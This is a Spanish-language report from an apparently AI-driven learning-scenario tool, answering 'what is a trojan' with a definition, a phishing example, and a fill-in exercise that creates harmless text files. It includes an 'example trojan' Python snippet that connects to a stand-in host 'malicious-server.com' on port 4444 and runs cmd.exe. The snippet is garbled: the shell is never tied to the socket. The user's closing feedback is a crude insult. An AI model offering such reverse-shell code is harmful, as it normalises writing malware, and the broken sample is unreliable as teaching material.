
    #  Reporte de Generador de Escenarios de Aprendizaje

    **Consulta:**  
    Que es un troyano

    **Respuesta IA:**  
    Hola, soy un experto en hackatones.

Información básica sobre un troyano:
Un troyano es un tipo de malware que se presenta como un software legítimo para engañar a los usuarios y hacer que lo instalen. Una vez instalado, puede permitir a un atacante acceder a la computadora de la víctima, robar información o realizar otras acciones maliciosas.

Ejemplo de cómo te pueden infectar:
Los troyanos a menudo se distribuyen a través de correos electrónicos de phishing, donde se envían archivos adjuntos que parecen inofensivos. Al abrir el archivo, el malware se instala en el sistema.

Código de ejemplo de un ataque troyano:

python
import socket
import os

def create_trojan():
    # Código para crear un socket y conectarse a un servidor remoto
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("malicious-server.com", 4444))
    os.system("cmd.exe")  # Abre la línea de comandos
    s.close()

create_trojan()



Ahora, por favor, inserta tu nombre: ____ y tu nota: _____.

Actividad: Completar un código de un troyano inofensivo

Completa el siguiente código para simular un troyano que crea archivos en una carpeta específica:


python
import os
import random
import string

def create_files(num_files):
    for i in range(num_files):
        filename = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".txt"
        with open(os.path.join("C:\\ruta\\a\\tu\\carpeta", filename), 'w') as f:
            f.write("Este es un archivo creado por un troyano inofensivo.")

# Llama a la función para crear 5 archivos
create_files(____)  # Completa con el número de archivos que deseas crear



Instrucciones:
1. Completa el espacio en blanco con el número de archivos que deseas que el código cree.
2. Explica brevemente cómo funciona el código y qué acciones realiza.

Espero que esta información y actividad te sean útiles.

    **Reporte del Usuario:**  
    menudo mierdon
        